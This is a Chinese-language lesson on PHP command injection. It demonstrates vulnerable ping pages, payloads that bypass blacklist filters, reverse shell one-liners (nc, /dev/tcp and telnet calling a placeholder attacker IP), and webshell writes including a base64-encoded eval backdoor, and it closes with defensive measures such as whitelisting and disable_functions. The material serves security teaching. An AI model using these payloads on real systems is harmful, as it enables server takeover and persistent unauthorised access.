## 上节课内容回顾
上一节我们介绍了命令执行漏洞的成因和危害。命令执行漏洞的产生，与SQL注入、XSS等漏洞类似，都是由于未对用户输入进行严格的检查和过滤，导致用户输入被当作代码执行。其危害在于，攻击者可以利用此漏洞执行服务器命令，从而获取服务器Shell。

![](img/f9341971581c5f978b3d86dc2731e860_38.png)

命令执行主要分为两种类型：
1.  **远程代码执行**：漏洞存在于代码逻辑中，执行的是PHP代码。若想执行系统命令，仍需调用PHP中执行系统命令的函数。
2.  **远程命令执行**：应用系统本身存在调用系统命令的功能点，通常通过PHP中调用系统命令的函数实现。若未对用户输入进行过滤，则极易产生漏洞。

## 命令执行漏洞利用演示 🔧

以下是利用命令执行漏洞的几种常见场景，我们将通过实例进行演示。

### 实例一：无过滤的命令执行
我们首先访问一个简单的测试页面，其功能是让用户输入一个IP地址进行Ping测试。

![](img/f9341971581c5f978b3d86dc2731e860_73.png)

![](img/f9341971581c5f978b3d86dc2731e860_75.png)

![](img/f9341971581c5f978b3d86dc2731e860_77.png)

![](img/f9341971581c5f978b3d86dc2731e860_79.png)

**页面核心代码逻辑分析：**
1.  通过 `POST` 方式接收用户输入的参数。
2.  使用 `php_uname()` 函数判断服务器操作系统类型。
3.  根据系统类型（Windows或Linux），拼接成不同的Ping命令（例如Windows为 `ping -n`， Linux为 `ping -c`）。
4.  使用 `shell_exec()` 函数执行拼接后的命令。
5.  关键问题在于，代码直接将用户输入的 `$ip` 变量拼接到命令中，未做任何过滤。

![](img/f9341971581c5f978b3d86dc2731e860_81.png)

![](img/f9341971581c5f978b3d86dc2731e860_83.png)

![](img/f9341971581c5f978b3d86dc2731e860_85.png)

![](img/f9341971581c5f978b3d86dc2731e860_87.png)

![](img/f9341971581c5f978b3d86dc2731e860_89.png)

**漏洞利用：**
由于没有过滤，我们可以使用特殊字符来拼接并执行额外的命令。例如，输入 `127.0.0.1 | whoami`。
*   **管道符 `|`**：无论前一个命令是否执行成功，都会执行后面的命令。
*   服务端最终执行的命令为：`ping -n 1 127.0.0.1 | whoami`
*   执行后，页面不仅会返回Ping的结果，还会返回 `whoami` 命令的执行结果（当前服务器用户，如`apache`）。

![](img/f9341971581c5f978b3d86dc2731e860_91.png)

![](img/f9341971581c5f978b3d86dc2731e860_93.png)

![](img/f9341971581c5f978b3d86dc2731e860_95.png)

![](img/f9341971581c5f978b3d86dc2731e860_96.png)

![](img/f9341971581c5f978b3d86dc2731e860_98.png)

![](img/f9341971581c5f978b3d86dc2731e860_99.png)

![](img/f9341971581c5f978b3d86dc2731e860_101.png)

![](img/f9341971581c5f978b3d86dc2731e860_103.png)

同理，我们可以执行其他命令，如 `127.0.0.1 | echo "<?php @eval(\$_POST[‘cmd‘]);?>" > shell.php` 来写入一句话木马。

### 实例二：存在黑名单过滤的命令执行
第二个例子中，代码对用户输入进行了黑名单过滤。

![](img/f9341971581c5f978b3d86dc2731e860_115.png)

![](img/f9341971581c5f978b3d86dc2731e860_117.png)

![](img/f9341971581c5f978b3d86dc2731e860_119.png)

![](img/f9341971581c5f978b3d86dc2731e860_121.png)

![](img/f9341971581c5f978b3d86dc2731e860_123.png)

![](img/f9341971581c5f978b3d86dc2731e860_125.png)

![](img/f9341971581c5f978b3d86dc2731e860_127.png)

![](img/f9341971581c5f978b3d86dc2731e860_129.png)

**过滤代码分析：**
```php
$blacklist = array(‘&&‘, ‘;‘);
$ip = str_replace($blacklist, ‘‘, $ip);
```
这段代码会将用户输入中的 `&&` 和 `;` 替换为空字符串。

![](img/f9341971581c5f978b3d86dc2731e860_131.png)

![](img/f9341971581c5f978b3d86dc2731e860_133.png)

![](img/f9341971581c5f978b3d86dc2731e860_135.png)

![](img/f9341971581c5f978b3d86dc2731e860_137.png)

![](img/f9341971581c5f978b3d86dc2731e860_139.png)

![](img/f9341971581c5f978b3d86dc2731e860_141.png)

**绕过方法：**
黑名单过滤往往不全面，我们可以尝试以下Payload进行绕过：
*   **Payload 1**: `127.0.0.1 &;& whoami`
    *   过滤后，`;`被移除，剩下 `127.0.0.1 && whoami`，成功构成命令连接符。
*   **Payload 2**: `127.0.0.1 &;| whoami`
    *   过滤后，`;`被移除，剩下 `127.0.0.1 &| whoami`。在某些环境下，`&|` 可能被解释为后台执行并管道传递。
*   还可以尝试使用未被过滤的其他连接符，如 `|`、`||`、`&` 等。

![](img/f9341971581c5f978b3d86dc2731e860_143.png)

![](img/f9341971581c5f978b3d86dc2731e860_145.png)

### 实例三：更严格的黑名单过滤
第三个例子扩展了黑名单。

![](img/f9341971581c5f978b3d86dc2731e860_147.png)

![](img/f9341971581c5f978b3d86dc2731e860_149.png)

**过滤代码分析：**
```php
$blacklist = array(‘&&‘, ‘;‘, ‘|‘, ‘|-‘);
```
这次过滤了 `&&`、`;`、`|` 甚至 `|` 加空格的情况。

**绕过思路：**
注意，它过滤的是 `|` 加空格 (`‘|-‘`)，但没有过滤单独的 `|`。因此，我们可以使用不带空格的管道符，如 `127.0.0.1|whoami`。

### 实例四：安全的代码示例（白名单思想）
第四个例子展示了一种相对安全的编码方式。

**安全代码逻辑分析：**
1.  接收用户输入后，使用 `stripslashes()` 函数处理可能的转义字符。
2.  使用 `explode(‘.‘, $ip)` 将IP地址按点号分割成四段。
3.  遍历这四段，使用 `is_numeric()` 函数判断每一段是否为数字。
4.  只有当四段全部是数字时，才将其重新拼接成IP地址，并带入 `shell_exec()` 执行Ping命令。

![](img/f9341971581c5f978b3d86dc2731e860_173.png)

![](img/f9341971581c5f978b3d86dc2731e860_175.png)

![](img/f9341971581c5f978b3d86dc2731e860_177.png)

![](img/f9341971581c5f978b3d86dc2731e860_179.png)

![](img/f9341971581c5f978b3d86dc2731e860_181.png)

![](img/f9341971581c5f978b3d86dc2731e860_183.png)

**安全性：**
这种设计基于一个前提：该功能点只需要接收合法的IP地址。任何包含非数字字符（如命令连接符 `|`、`&`）的输入，在 `is_numeric()` 检查阶段就会被判定为非法，从而不会执行后续命令。这体现了“白名单”的防御思想，只允许符合严格格式的输入。

### 1. 反弹Shell
直接获取一个交互式Shell会话。

![](img/f9341971581c5f978b3d86dc2731e860_201.png)

![](img/f9341971581c5f978b3d86dc2731e860_202.png)

![](img/f9341971581c5f978b3d86dc2731e860_204.png)

![](img/f9341971581c5f978b3d86dc2731e860_206.png)

*   **方法一：使用 `nc` (netcat) 反向连接**
    *   在攻击机上监听一个端口：`nc -lvp 4444`
    *   在存在漏洞的输入点执行：`127.0.0.1; nc -e /bin/bash 攻击机IP 4444`
    *   执行后，攻击机的`nc`监听端口会收到一个来自目标服务器的Shell连接。

![](img/f9341971581c5f978b3d86dc2731e860_208.png)

![](img/f9341971581c5f978b3d86dc2731e860_210.png)

![](img/f9341971581c5f978b3d86dc2731e860_212.png)

*   **方法二：使用 `bash` 或 `telnet` 反向连接**
    *   在攻击机上监听：`nc -lvp 5555`
    *   在漏洞点执行：`127.0.0.1; bash -i >& /dev/tcp/攻击机IP/5555 0>&1`
    *   这是Linux下经典的bash反弹Shell命令。

![](img/f9341971581c5f978b3d86dc2731e860_214.png)

![](img/f9341971581c5f978b3d86dc2731e860_216.png)

![](img/f9341971581c5f978b3d86dc2731e860_220.png)

![](img/f9341971581c5f978b3d86dc2731e860_222.png)

*   **方法三：使用 `telnet` 正向连接**
    *   在攻击机上监听：`nc -lvp 6666`
    *   在漏洞点执行：`127.0.0.1; telnet 攻击机IP 6666 | /bin/bash | telnet 攻击机IP 6666`
    *   这种方法让目标服务器主动连接到攻击机，并将bash的输入输出重定向到该连接。

### 2. 写入WebShell
如果无法直接反弹Shell，或者需要持久化控制，可以写入WebShell。

![](img/f9341971581c5f978b3d86dc2731e860_235.png)

![](img/f9341971581c5f978b3d86dc2731e860_236.png)

![](img/f9341971581c5f978b3d86dc2731e860_238.png)

![](img/f9341971581c5f978b3d86dc2731e860_240.png)

![](img/f9341971581c5f978b3d86dc2731e860_242.png)

*   **直接写入一句话木马**：
    `127.0.0.1; echo ‘<?php @eval($_POST[“cmd“]);?>‘ > /var/www/html/shell.php`
*   **绕过过滤的WebShell写入**：
    如果黑名单过滤了分号`;`，可以构造不使用分号的PHP代码。例如，利用 `<?php if(isset($_GET[‘c‘])) eval($_GET[‘c‘])?>`，然后通过 `&` 或 `|` 连接命令写入。
*   **编码后写入**：
    对于过滤严格的场景，可以将WebShell代码进行Base64编码后再解码写入。
    ```bash
    echo ‘PD9waHAgQGV2YWwoJF9QT1NUWyJjbWQiXSk7Pz4=‘ | base64 -d > shell.php
    ```
    对应的Payload可以构造为：`127.0.0.1 | echo PD9waHAgQGV2YWwoJF9QT1NUWyJjbWQiXSk7Pz4= | base64 -d > shell.php`

### 1. 禁用高危函数
在PHP配置文件 (`php.ini`) 中，通过 `disable_functions` 选项禁用不必要的危险函数。
```ini
disable_functions = exec,system,passthru,shell_exec,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source,eval,assert
```
这样即使存在代码执行漏洞，攻击者也无法调用这些函数来执行系统命令。

### 2. 严格过滤输入
*   **使用白名单**：针对功能需求，严格定义允许的字符集合。例如，对于IP地址输入，只允许数字和点号。
*   **转义或过滤特殊字符**：对用户输入中的所有Shell元字符进行转义，如 `|`、`&`、`;`、`>`、`<`、`$`、`()`、`\``、`!` 等。可以使用 `escapeshellarg()` 或 `escapeshellcmd()` 函数。
*   **参数化调用**：避免直接拼接命令。如果必须调用系统命令，应使用数组形式传递参数，如 `exec(‘ping‘, [‘-c‘, ‘1‘, $user_input_ip])`，但这需要程序本身支持。

### 3. 启用安全模式（PHP 5.4之前）
在旧版PHP中，可以在 `php.ini` 中设置 `safe_mode = On`。启用后，许多文件系统和进程控制函数会受到限制。同时，必须通过 `safe_mode_exec_dir` 指定允许执行系统命令的目录。**（注：PHP 5.4及以上版本已移除此特性）**

### 4. 最小权限原则
运行Web服务器（如Apache、Nginx）的进程账户（如`www-data`、`apache`）应仅拥有必要的最小权限。避免使用root权限运行Web服务。这样即使被攻破，攻击者获得的权限也有限。

### 5. 代码审计与安全意识
开发者应避免将用户输入直接传递给任何命令执行函数。在代码审计时，重点关注 `eval()`、`assert()`、`system()`、`exec()`、`passthru()`、`shell_exec()`、反引号 \`\` 等函数的使用点。

本节课我们一起深入学习了命令执行漏洞的利用与防护。
*   **利用方面**：我们通过四个由浅入深的实例，演示了如何利用特殊字符（如 `|`、`&`、`;`）绕过无过滤或简单的黑名单过滤，执行任意系统命令。并进一步学习了反弹Shell和写入WebShell等高级利用技巧。
